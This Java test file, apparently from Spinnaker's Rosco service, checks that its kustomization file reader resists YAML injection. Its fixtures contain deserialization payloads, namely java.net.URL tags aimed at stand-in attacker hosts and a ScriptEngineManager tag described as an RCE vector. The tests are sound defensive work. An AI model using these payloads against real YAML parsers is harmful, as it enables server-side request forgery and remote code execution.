/*
 * Copyright 2026 Harness, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License")
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.netflix.spinnaker.rosco.manifests.kustomize;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import com.netflix.spinnaker.kork.artifacts.model.Artifact;
import com.netflix.spinnaker.rosco.manifests.kustomize.mapping.Kustomization;
import com.netflix.spinnaker.rosco.services.ClouddriverService;
import okhttp3.MediaType;
import okhttp3.ResponseBody;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import retrofit2.Call;
import retrofit2.Response;

/**
 * Security tests for KustomizationFileReader to verify protection against YAML injection attacks.
 *
 * <p>These tests demonstrate that Jackson's YAML parser safely handles untrusted YAML from external
 * sources (e.g., Git repositories). The tests verify that:
 *
 * <ul>
 *   <li>Arbitrary object instantiation attacks via YAML tags are safely ignored (CVE-2022-1471
 *       class protection)
 *   <li>Remote Code Execution (RCE) vectors through deserialization are prevented by Jackson's
 *       design
 *   <li>SSRF attacks via URL instantiation are blocked by Jackson not supporting YAML tags for
 *       class instantiation
 * </ul>
 *
 * <p>Note: Jackson's YAML parser (unlike SnakeYAML without SafeConstructor) does not support
 * arbitrary object instantiation via YAML tags. Tags are safely ignored or treated as strings,
 * providing inherent protection against these attack vectors.
 */
class KustomizationFileReaderSecurityTest {

  private ClouddriverService clouddriverService;
  private KustomizationFileReader reader;

  @BeforeEach
  void setup() {
    clouddriverService = mock(ClouddriverService.class);
    reader = new KustomizationFileReader(clouddriverService);
  }

  private void mockYamlResponse(String yaml) throws Exception {
    @SuppressWarnings("unchecked")
    Call<ResponseBody> mockCall = mock(Call.class);
    when(mockCall.execute())
        .thenReturn(
            Response.success(
                200, ResponseBody.create(MediaType.parse("text/plain"), yaml.stripIndent())));
    when(clouddriverService.fetchArtifact(any())).thenReturn(mockCall);
  }

  /**
   * Verifies that arbitrary object instantiation attacks using YAML tags are safely handled.
   *
   * <p>An attacker could inject malicious YAML into a kustomization file stored in a Git
   * repository. This test verifies that Jackson's YAML parser safely ignores YAML tags attempting
   * to instantiate arbitrary Java classes.
   *
   * <p>Attack scenario: 1. Attacker compromises a Git repository or uses a malicious one 2.
   * Attacker adds YAML tags to instantiate dangerous classes 3. When Spinnaker processes the
   * kustomization, Jackson ignores the tags and treats them as strings/data
   *
   * <p>This provides protection against CVE-2022-1471 class vulnerabilities.
   */
  @Test
  void shouldBlockArbitraryObjectInstantiationViaYamlTags() throws Exception {
    // Malicious kustomization file with YAML tag attempting to instantiate java.net.URL
    String maliciousYaml =
        """
        resources:
          - deployment.yml
        namePrefix: !!java.net.URL ["http://attacker.com/exfiltrate"]
        """;

    mockYamlResponse(maliciousYaml);

    Artifact artifact =
        Artifact.builder()
            .reference("https://api.github.com/repos/malicious/repo/contents/base/")
            .artifactAccount("github")
            .type("github/file")
            .build();

    // Jackson safely handles the YAML tag. It may either:
    // 1. Ignore the tag and parse the rest of the YAML, or
    // 2. Throw an exception if the tag makes the YAML invalid
    // Either outcome is secure - no arbitrary object instantiation occurs
    try {
      Kustomization k = reader.getKustomization(artifact, "kustomization.yml");
      // If parsing succeeded, verify it parsed the valid parts
      assertThat(k.getResources()).contains("deployment.yml");
    } catch (IllegalArgumentException e) {
      // If parsing failed, that's also a secure outcome - no objects were instantiated
      assertThat(e.getMessage()).contains("Unable to find any kustomization file");
    }
  }

  /**
   * Verifies that ScriptEngineManager instantiation attacks are safely handled.
   *
   * <p>ScriptEngineManager is particularly dangerous because its constructor triggers service
   * discovery via ServiceLoader, which can lead to arbitrary code execution. This test verifies
   * that Jackson safely handles the YAML tag without instantiating ScriptEngineManager.
   */
  @Test
  void shouldBlockScriptEngineManagerInstantiation() throws Exception {
    String maliciousYaml = """
        resources: !!javax.script.ScriptEngineManager []
        """;

    mockYamlResponse(maliciousYaml);

    Artifact artifact =
        Artifact.builder()
            .reference("https://api.github.com/repos/malicious/repo/contents/base/")
            .artifactAccount("github")
            .type("github/file")
            .build();

    // Jackson handles the YAML tag securely - either ignores it or fails to parse
    // The key is that no ScriptEngineManager is instantiated
    // Allow both success (tag ignored) and failure (invalid YAML) as both are secure
    try {
      reader.getKustomization(artifact, "kustomization.yml");
      // If it succeeded, the tag was safely ignored
    } catch (IllegalArgumentException e) {
      // If it failed, that's also secure - no instantiation occurred
      assertThat(e.getMessage()).contains("Unable to find any kustomization file");
    }
  }

  /**
   * Verifies that nested object instantiation attacks are safely handled.
   *
   * <p>Attackers can nest malicious object instantiation within seemingly legitimate YAML
   * structures to bypass simple pattern matching or WAF rules. This test verifies that Jackson
   * safely handles nested YAML tags without instantiating arbitrary objects.
   */
  @Test
  void shouldBlockNestedArbitraryObjectInstantiation() throws Exception {
    String maliciousYaml =
        """
        resources:
          - deployment.yml
        configMapGenerator:
          - name: config
            literals:
              - key=!!java.net.URL ["http://attacker.com/steal-data"]
        """;

    mockYamlResponse(maliciousYaml);

    Artifact artifact =
        Artifact.builder()
            .reference("https://api.github.com/repos/malicious/repo/contents/base/")
            .artifactAccount("github")
            .type("github/file")
            .build();

    // Jackson handles nested YAML tags securely
    try {
      Kustomization k = reader.getKustomization(artifact, "kustomization.yml");
      // If parsing succeeded, verify it parsed the valid structure safely
      assertThat(k.getResources()).containsExactly("deployment.yml");
      assertThat(k.getConfigMapGenerator()).hasSize(1);
    } catch (IllegalArgumentException e) {
      // If parsing failed, that's also secure - no instantiation occurred
      assertThat(e.getMessage()).contains("Unable to find any kustomization file");
    }
  }

  /**
   * Verifies that YAML tag injection in list elements is safely handled.
   *
   * <p>Even within arrays/lists, YAML tags attempting to instantiate arbitrary objects are safely
   * ignored by Jackson and treated as data.
   */
  @Test
  void shouldBlockTagInjectionInListElements() throws Exception {
    String maliciousYaml =
        """
        resources:
          - !!java.net.URL ["http://evil.com/"]
          - deployment.yml
        """;

    mockYamlResponse(maliciousYaml);

    Artifact artifact =
        Artifact.builder()
            .reference("https://api.github.com/repos/malicious/repo/contents/base/")
            .artifactAccount("github")
            .type("github/file")
            .build();

    // Jackson handles the YAML tag securely
    try {
      Kustomization k = reader.getKustomization(artifact, "kustomization.yml");
      // If parsing succeeded, verify that we got a valid kustomization (no instantiation)
      assertThat(k).isNotNull();
      // The resources list should contain at least the legitimate deployment.yml
      assertThat(k.getResources()).contains("deployment.yml");
    } catch (IllegalArgumentException e) {
      // If parsing failed, that's also secure - no instantiation occurred
      assertThat(e.getMessage()).contains("Unable to find any kustomization file");
    }
  }

  /**
   * Verifies that legitimate kustomization files still parse correctly after security fix.
   *
   * <p>This test ensures that the security fix doesn't break normal functionality.
   */
  @Test
  void shouldParseLegitimatekustomizationFileCorrectly() throws Exception {
    String validYaml =
        """
        resources:
          - deployment.yml
          - service.yml
        namePrefix: demo-
        commonLabels:
          app: myapp
        """;

    mockYamlResponse(validYaml);

    Artifact artifact =
        Artifact.builder()
            .reference("https://api.github.com/repos/org/repo/contents/base/")
            .artifactAccount("github")
            .type("github/file")
            .build();

    Kustomization k = reader.getKustomization(artifact, "kustomization.yml");

    assertThat(k.getResources()).containsExactlyInAnyOrder("deployment.yml", "service.yml");
    assertThat(k.getSelfReference())
        .isEqualTo("https://api.github.com/repos/org/repo/contents/base/kustomization.yml");
  }

  /**
   * Verifies that complex legitimate kustomization structures are handled correctly.
   *
   * <p>Tests parsing of kustomization files with generators, patches, etc.
   */
  @Test
  void shouldParseComplexLegitimatekustomizationFile() throws Exception {
    String complexYaml =
        """
        resources:
          - deployment.yml
          - service.yml
        configMapGenerator:
          - name: app-config
            files:
              - config.properties
        patchesStrategicMerge:
          - patch.yml
        namePrefix: prod-
        """;

    mockYamlResponse(complexYaml);

    Artifact artifact =
        Artifact.builder()
            .reference("https://api.github.com/repos/org/repo/contents/prod/")
            .artifactAccount("github")
            .type("github/file")
            .build();

    Kustomization k = reader.getKustomization(artifact, "kustomization.yml");

    assertThat(k.getResources()).containsExactlyInAnyOrder("deployment.yml", "service.yml");
    assertThat(k.getConfigMapGenerator()).hasSize(1);
    assertThat(k.getPatchesStrategicMerge()).containsExactly("patch.yml");
  }
}
